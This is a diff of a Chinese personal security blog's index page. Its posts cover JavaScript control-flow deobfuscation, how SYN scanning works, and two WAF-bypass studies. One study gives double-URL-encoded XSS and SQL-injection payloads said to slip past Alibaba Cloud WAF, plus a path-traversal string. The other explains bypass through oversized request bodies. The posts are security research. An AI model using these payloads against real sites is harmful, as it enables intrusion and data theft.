-<p>“控制流平坦化”是将一些顺序执行的代码，变化成阅读难度更大的<code>while-switch-case</code>或者<code>for-switch-case</code>代码。可以见<a target="_blank" rel="noopener" href="https://github.com/Tsaiboss/ControlFlow">ControlFlow</a>这个项目的例子。</p>
-</blockquote>
-<p>如果能够”反混淆”这种”控制流平坦化”混淆后的代码，就能让代码变得更容易阅读一些。</p>
-<p>本文介绍”反控制流平坦化”的思路和实践过程，最终可以反混淆<code>ControlFlow</code>和<code>https://obfuscator.io/</code>两个工具的”控制流平坦化”。</p>
-<p>反混淆思路：</p>
-<ul>
-<li>按照”while-switch-case”执行顺序，拼接case语句</li>
-</ul>
-<h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><ul>
-<li><p>怎么实现？</p>
-<p>分为两步：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 第一步获取case块的执行顺序</span><br><span class="line">* 第二部根据case块的执行顺序，拼接case块</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>怎么获取”case块的执行顺序”？</p>
-<p>思路是在每个case块中”注入代码”，然后在浏览器中执行js代码，执行过程”注入代码”就可以记录执行顺序。我理解这个类似”软件测试”中计算”代码覆盖率”时用到的插桩。</p>
-<p>原始代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">while (!![])&#123;</span><br><span class="line">  switch (...)&#123;</span><br><span class="line">    case &quot;0&quot;:</span><br><span class="line">      ...</span><br><span class="line">    case &quot;1&quot;:</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>插桩后,代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 利用&quot;插桩&quot;记录while-switch-case执行顺序</span><br><span class="line">&#x2F;&#x2F; 集合 &#x3D; &#123;while id: [case1节点, case2节点，case3节点，case2节点]&#125;</span><br><span class="line"></span><br><span class="line">let while_id_stack &#x3D; []  &#x2F;&#x2F; 栈</span><br><span class="line"></span><br><span class="line">let collection &#x3D; &#123;&#125;</span><br><span class="line"></span><br><span class="line">while (!![])&#123;</span><br><span class="line">  while_statement_id &#x3D; 111</span><br><span class="line">  while_id_stack.push(while_statement_id)</span><br><span class="line">  collection[while_statement_id] &#x3D; []</span><br><span class="line"></span><br><span class="line">  switch (...)&#123;</span><br><span class="line">    case &quot;0&quot;:</span><br><span class="line">      case_statement_id &#x3D; 222</span><br><span class="line">      while_id_on_stack_op &#x3D; while_id_stack[while_id_stack.length-1]</span><br><span class="line">      collection[while_id_on_stack_op].push(case_statement_id)</span><br><span class="line">      ...</span><br><span class="line">    case &quot;1&quot;:</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  while_id_stack.pop()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">record(collection)</span><br></pre></td></tr></table></figure>
-
-<p>浏览器运行后，集合中就存放有case节点的执行顺序。</p>
-<p>上面都是伪代码，具体实现见 hook.js</p>
-</li>
-<li><p>怎么拼接case块？</p>
-<p>伪代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">集合 &#x3D; &#123;while id: [case1节点, case2节点，case3节点，case2节点]&#125;</span><br><span class="line"></span><br><span class="line">函数1：</span><br><span class="line"></span><br><span class="line">  遍历ast，如果遇到while语句 &#123;</span><br><span class="line">    得到当前while id</span><br><span class="line"></span><br><span class="line">    if while id in 集合:</span><br><span class="line">      顺序拼接各个case块内容</span><br><span class="line"></span><br><span class="line">      用&quot;拼接后的顺序语句&quot;替换&quot;while语句&quot;</span><br><span class="line"></span><br><span class="line">      从集合中删除 while id记录</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">while 集合中还有元素:</span><br><span class="line"></span><br><span class="line">  调用 函数1</span><br></pre></td></tr></table></figure>
-
-<p>具体实现见 simple_decode.js</p>
-</li>
-</ul>
-<h1 id="实现结果"><a href="#实现结果" class="headerlink" title="实现结果"></a>实现结果</h1><p>可以将”while-switch-case代码块”变成”顺序执行的代码块”。</p>
-<p>比如 PlayWithObfuscator/tests/encoded_js/simple.js 中的混淆后的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">while (!![]) &#123;</span><br><span class="line">    switch (_0xcgcd3c[_0x3922ce++]) &#123;</span><br><span class="line">        case &quot;0&quot;:</span><br><span class="line">            if (_0x33g15b &#x3D; _0x5153cd.charCodeAt(_0xeea791 +&#x3D; .75), _0x33g15b &gt; 255) throw new t(&quot;&#39;btoa&#39; failed: The string to be encoded contains characters outside of the Latin1 range.&quot;);</span><br><span class="line">            continue;</span><br><span class="line"></span><br><span class="line">        case &quot;1&quot;:</span><br><span class="line">            _0xed1fcd &#x3D; _0xed1fcd &lt;&lt; 8 | _0x33g15b;</span><br><span class="line">            continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>转换成 阅读性更好一些的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (_0x33g15b &#x3D; _0x5153cd.charCodeAt(_0xeea791 +&#x3D; .75), _0x33g15b &gt; 255) throw new t(&quot;&#39;btoa&#39; failed: The string to be encoded contains characters outside of the Latin1 range.&quot;);</span><br><span class="line">_0xed1fcd &#x3D; _0xed1fcd &lt;&lt; 8 | _0x33g15b;</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>目前属于demo阶段，可以对以下工具的”控制流平坦化”做反混淆：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://obfuscator.io/">https://obfuscator.io/</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/Tsaiboss/ControlFlow">https://github.com/Tsaiboss/ControlFlow</a></li>
-</ul>
-<p>测试结果在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/PlayWithObfuscator/tree/main/tests">tests目录</a> 看到</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a314131070/article/details/106567825?spm=1001.2014.3001.5501">JS反混淆-控制流平展（一）</a></p>
 
       
     </div>
@@ -827,6 +1080,124 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%B8%BA%E4%BB%80%E4%B9%88masscan%E5%BF%AB%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E4%B8%BA%E4%BB%80%E4%B9%88masscan%E5%BF%AB%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">为什么masscan扫描快（一）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>某天想到一个常见的安全面试问题：”为什么masscan扫描快？”</p>
+<p>以往我认为是下面三点原因：</p>
+<ul>
+<li>使用syn扫描</li>
+<li>扫描地址随机化</li>
+<li>发包和接受包使用了性能更好的pf_ring包处理框架</li>
+</ul>
+<p>随着最近补了一些网络的基础知识，感觉有点不对劲：</p>
+<ul>
+<li>nmap也支持syn扫描、扫描地址随机化，所以masscan真的是因为这两点比nmap快么？</li>
+<li>nmap用的是啥发包，它为什么不用pf_ring呢？</li>
+<li>pf_ring真的快么？</li>
+</ul>
+<p>这一篇文章主要记录我对syn扫描的学习和做扫描器时遇到的案例。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="什么是syn扫描？"><a href="#什么是syn扫描？" class="headerlink" title="什么是syn扫描？"></a>什么是syn扫描？</h2><p>  也叫半连接扫描，基于sendto系统调用。</p>
+<p>  在syn扫描出现之前，端口扫描大多数基于connect系统调用，因此会完成tcp三次握手。</p>
+<h2 id="为什么要用syn扫描？"><a href="#为什么要用syn扫描？" class="headerlink" title="为什么要用syn扫描？"></a>为什么要用syn扫描？</h2><p>  一般都会说syn有三个好处：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 更隐蔽（相比于connect扫描）</span><br><span class="line">* 更快（相比于connect扫描）</span><br><span class="line">* 比ACK&#x2F;Window&#x2F;Maimon scans等扫描方式（namp的-sA&#x2F;sW&#x2F;sM参数）兼容性好</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>真的更隐蔽么？</p>
+<p>说syn扫描隐蔽的原因是”被扫描主机”和”IDS/IPS”设备 因为没有看到完整的”三次握手”，所以不会记录日志。</p>
+<p>然而现在的防护设备似乎都认识syn扫描，所以已经没有”更隐蔽”这个优势了。</p>
+</li>
+<li><p>为什么比connect扫描快？</p>
+<p>我以前的误区是connect扫描握手需要三个包，而syn扫描是只需要两个包，少发了一个包所以更快。</p>
+<p>实际上更快的原因是：</p>
+<p>当客户端发出去的syn包后收不到响应时（”网络质量不好”或者”扫描目标ip不存在”时会发生）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* connect扫描因为用的是connect系统调用，所以会重传syn包。在linux默认配置时，最多会等待32s才会返回</span><br><span class="line"></span><br><span class="line">* syn扫描因为使用sendto系统调用，它把syn包发出去后就可以立马返回，不会等syn-ack包</span><br></pre></td></tr></table></figure>
+
+<p>一个需要阻塞等待，另一个发送完就返回了，那肯定是发完就返回的快啊。</p>
+<p>看到这里，不知道你会不会质疑我：发完就返回，不等syn-ack包，那syn扫描怎么判断端口是开放的。</p>
+</li>
+</ul>
+<h2 id="syn扫描是怎么判断端口是开放的？"><a href="#syn扫描是怎么判断端口是开放的？" class="headerlink" title="syn扫描是怎么判断端口是开放的？"></a>syn扫描是怎么判断端口是开放的？</h2><p>  虽然sendto系统调用”不等待syn-ack包”，但是当syn-ack包来的时候我们再接着处理就好了。</p>
+<p>  比如当系统接收到一个syn-ack包，我们看一下包是不是从我们扫描对象发过来的，如果是我们就可以从syn-ack包中取出端口信息，认为目标端口是开放的。当然为了防止一些误报，我们还可以做一些检查。</p>
+<p>  所以在syn扫描实现时，我们可以采用两个线程（masscan也是这么实现的）：</p>
+<ul>
+<li>一个线程专门来发syn包</li>
+<li>另一个线程专门来接收syn-ack包，从syn-ack包中判断端口是否开放</li>
+</ul>
+<h2 id="show-me-the-demo"><a href="#show-me-the-demo" class="headerlink" title="show me the demo"></a>show me the demo</h2><p>  网上找的一个demo <a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/38642133">简单实现SYN端口扫描</a></p>
+<p>  发送请求：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sockfd &#x3D; socket(AF_INET,SOCK_RAW,IPPROTO_TCP)  # 使用SOCK_RAW创建原始套接字</span><br><span class="line">..</span><br><span class="line">int ret &#x3D; sendto(sockfd,buffer,sizeof(tcpHeader),0,(struct sockaddr*)&amp;target,sizeof(target)) ;  # 发送syn包后立马返回</span><br></pre></td></tr></table></figure></p>
+<p>  接收请求：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size &#x3D; recvfrom(sockfd,msg,sizeof(msg),0,(struct sockaddr*)&amp;myaddr,&amp;len) ;  &#x2F;&#x2F; 阻塞接收ack包</span><br></pre></td></tr></table></figure></p>
+<h2 id="之前做扫描器实践中遇到的案例"><a href="#之前做扫描器实践中遇到的案例" class="headerlink" title="之前做扫描器实践中遇到的案例"></a>之前做扫描器实践中遇到的案例</h2><p>  端口扫描结果中发现有的ip开放了5000+个端口，并且端口上似乎没有什么业务。</p>
+<p>  估摸着我可能遇到了 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2a03fb550cf5">DDOS之syn flood 原理及防护</a> 中提到的syn代理。</p>
+<p>  防火墙只要遇到syn包都回syn-ack,这样syn扫描时就会认为端口是开放的。</p>
+<p>  PS：下次再碰到这样的目标详细看看。如果读者有现成的目标案例，欢迎公众号私信给我。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>syn扫描比connect扫描快是因为connect扫描不太受用户程序控制，有可能等待很久。</li>
+<li>syn扫描实现会有两个线程，一个线程负责发syn包，另一个线程负责接收syn-ack包、判断端口开放、回rst包</li>
+</ul>
+<p>另外nmap的文档关于syn扫描和connect扫描都写得很好，值得阅读。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://nmap.org/book/synscan.html#scan-methods-fig-syn-scan-open">nmap官方文档-syn扫描</a></li>
+<li><a target="_blank" rel="noopener" href="https://nmap.org/book/scan-methods-connect-scan.html">nmap官方文档-connect扫描</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%B8%80%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -999,367 +1370,6 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%BA%8C%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">你的扫描器可以绕过防火墙么（二）</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>看了<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/P5h9_K4YcvsrU4tsdHsJdQ">你的扫描器可以绕过防火墙么？（一）</a>的可能会觉得文章中用base64绕过场景有限。这篇文章介绍一种绕过场景更多一点的方法。</p>
-<p>用过商业waf产品的应该都知道，waf一般都会支持多种解码类型，比如base64、url、unicode等。</p>
-<p>所以<code>Li4vLi4vLi4vZXRjL3Bhc3N3ZA==</code>(“../../../etc/passwd”的base64编码)这种payload，会被waf解码后拦截。</p>
-<p>这里存在一个设计问题：如果waf只检测解码后的数据，不检测原始数据，就会存在一种通用绕过，很多web防护都有可能失效。</p>
-<p>我研究了下面的问题：</p>
-<ul>
-<li>怎么验证waf是否”只检测解码后的数据，不检测原始数据”？</li>
-<li>哪些waf存在这种绕过风险？</li>
-<li>怎么利用？</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>怎么验证？</p>
-<p>构造满足下面条件的数据：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 如果waf没有解码模块，此数据就应该被拦截</span><br><span class="line">* 如果waf有解码模块，解码后，此数据不应该被拦截</span><br></pre></td></tr></table></figure>
-
-<p>如果这个数据经过waf没有被拦截，就说明 存在风险。</p>
-<p>比如，如果有一个waf面对如下的测试payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a&#x3D;&quot;&quot;&gt;alert(1) &#x2F;&#x2F; 被waf拦截</span><br><span class="line">&lt;script a&#x3D;&quot;&quot;&gt;&lt;&#x2F;script&gt;&lt;x a&#x3D;&quot;&gt;alert(1) &#x2F;&#x2F; 不被waf拦截</span><br></pre></td></tr></table></figure>
-<p>其中第二个payload是通过”在第一个payload双引号中添加数据”构造出来的</p>
-<p>就可以构造出下面的”最终payload”：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a&#x3D;&quot;%25%32%32%25%33%65%25%33%63%25%32%66%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65%25%33%63%25%37%38%25%32%30%25%36%31%25%33%64&quot;&gt;alert(1)</span><br></pre></td></tr></table></figure>
-
-<p>如果”此waf只检测解码后的数据，不检测原始数据”，就不会拦截”最终payload”</p>
-</li>
-<li><p>验证阿里云waf</p>
-<p>以下是阿里云waf实际拦截结果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x alert&quot;&#39;&gt;  拦截</span><br><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x&quot;&gt; alert&quot;&#39;&gt;  不拦截</span><br></pre></td></tr></table></figure>
-
-<p>所以可以构造出下面的payload并验证</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;svg onload&#x3D;&#39;xxxx&#x3D;&quot;x%25%32%32%25%33%65 alert&quot;&#39;&gt;  没有拦截</span><br></pre></td></tr></table></figure>
-
-<p>所以，阿里云waf确实存在风险，用<code>a=&lt;svg onload=&#39;xxxx=&quot;x%25%32%32%25%33%65&quot;; alert(1);&#39;&gt;</code>payload就可以绕过</p>
-</li>
-<li><p>验证长亭waf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert(&quot;111&quot;)  中危</span><br><span class="line">a&#x3D;alert(&quot;111&quot;&quot;) 正常</span><br></pre></td></tr></table></figure>
-
-<p>所以可以构造出下面的payload并验证</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;alert(&quot;111%25%32%32&quot;)   中危</span><br></pre></td></tr></table></figure>
-
-<p>所以，长亭waf不存在此风险</p>
-</li>
-<li><p>怎么利用？</p>
-<p>如果waf存在此风险，就有可能导致非常多的web防护失效。</p>
-<p>构造payload的过程如同上面”怎么验证”的过程。</p>
-<p>下面再补充一个同样方式绕过阿里云sql注入防护的案例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;union&#x2F;*anything*&#x2F;select &quot;111&quot;  拦截</span><br><span class="line">a&#x3D;union&#x2F;**&#x2F;*&#x2F; select &quot;111&quot;  未拦截，但是此payload不是有效的</span><br><span class="line"></span><br><span class="line">因此可以得到下面 不拦截、且有效的 payload</span><br><span class="line">a&#x3D;union&#x2F;*%25%32%61%25%32%66*&#x2F;select &quot;111&quot;  未拦截，且payload有效</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h1 id="最后给自己的公众号打下广告"><a href="#最后给自己的公众号打下广告" class="headerlink" title="最后给自己的公众号打下广告"></a>最后给自己的公众号打下广告</h1><p>我在内部安全保障、安全产品两个方向有一些工作经验；在启明、百度等大厂也都呆过，也曾在房多多和安全团队一起做过从0到1的安全建设；在漏洞挖掘这一块虽然不是经验丰富，但之前也给”华为、阿里、360、百度、字节”等国内的大厂提交过一些高危严重漏洞（PS：并不代表我觉得这些src都非常好）；</p>
-<p>我后面会持续写 “安全产品”、”后端开发”、”有意思的安全问题/漏洞”，如果读者有什么想一起讨论的”题材”，欢迎在公众号后台留言；</p>
-<p>目前公众号一篇文章阅读量只有50-70，感觉太惨淡了。如果读者觉得我的文章有帮助，就希望能在公众号”点赞、在看、分享”，”点赞”和”在看”似乎也能增加一些曝光量。要不然文章就只能关注的人才能看得到。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%B8%89%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%B8%89%EF%BC%89/" class="post-title-link" itemprop="url">你的扫描器可以绕过防火墙么（三）</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://github.com/pyn3rd/papers/blob/master/KCon_2019_WAF.pdf">How to Break Through Cloud-Based WAF</a> 提到 “post请求体过大时会绕过某些waf”。</p>
-<p>刚好今天看到一个用此方法绕过的案例：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Java反序列化数据绕WAF之加大量脏数据</a></p>
-<p>这个绕过姿势记得在2017年就有人分享过，因为我对”因为性能原因所以导致waf放行”这个解释有点疑问，所以研究了一下。</p>
-<p>本文主要研究:</p>
-<ul>
-<li>为什么请求体过大时会绕过waf的防护？</li>
-<li>什么场景下可以使用这种绕过姿势攻击到后端服务？</li>
-<li>怎么测试？</li>
-</ul>
-<p>以下研究的waf都是基于openresty实现的。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>openresty怎么读请求体？</p>
-<p><a target="_blank" rel="noopener" href="https://moonbingbing.gitbooks.io/openresty-best-practices/content/openresty/get_req_body.html">获取请求 body</a> 的代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ngx.req.read_body()</span><br><span class="line">local data &#x3D; ngx.req.get_body_data()</span><br><span class="line">-- local file_name &#x3D; ngx.req.get_body_file()</span><br></pre></td></tr></table></figure>
-
-<p>根据 <a target="_blank" rel="noopener" href="https://github.com/openresty/lua-nginx-module#ngxreqread_body">openresty文档</a> 得知</p>
-<blockquote>
-<p>如果请求体存放到了临时文件，就应该调用 <code>ngx.req.get_body_file</code> 接口来获取临时文件名。</p>
-<p>如果请求体存放到内存中，就应该调用 <code>ngx.req.get_body_data</code> 接口来获取请求体。</p>
-</blockquote>
-<p><em>什么时候请求体会存放到临时文件呢？</em></p>
-<p> 有两个配置选项决定nginx是否会把请求体放到临时文件:</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size">client_body_buffer_size</a>:如果请求体大小超过此值，就会把整个请求体或者请求体的一部分写到一个临时文件。</p>
-<p><a target="_blank" rel="noopener" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_in_file_only">client_body_in_file_only</a>:此选项直接决定nginx是否将请求体放到文件中。</p>
-</blockquote>
-</li>
-<li><p>为什么请求体过大时会绕过waf的防护？</p>
-<p>请求体过大，超过 client_body_buffer_size 配置的值时，请求体会写到临时文件。</p>
-<p>而很多waf不处理临时文件。相当于拿到的请求体会为空。比如曾经很火的 <a target="_blank" rel="noopener" href="https://github.com/loveshell/ngx_lua_waf/blob/master/waf.lua">ngx_lua_waf</a> 就没有临时文件相关操作。</p>
-<p><em>那为啥waf作者没有处理临时文件呢？</em></p>
-<p>可能是忘了，也可能觉得损耗性能。这里的性能我理解主要是与 io、内存有关。</p>
-<p>在openresty中读文件可以有两个api：</p>
-<blockquote>
-<p> ngx_io.open，此api是非阻塞的</p>
-<p> io.open，此api是阻塞的</p>
-</blockquote>
-<p>如果使用<code>io.open</code>读”临时文件”，整个nginx worker就会卡在这个读文件步骤中，肯定会导致整个集群能服务的最大并发数变低。</p>
-<p>如果使用<code>lua-io-nginx-module</code>模块的<code>ngx_io.open</code>非阻塞api来代替<code>io.open</code>阻塞api来读文件，虽然不会阻塞整个nginx worker，但”读文件io操作”还是要和磁盘打交道，需要中断和多次内存拷贝，还是有性能损耗。</p>
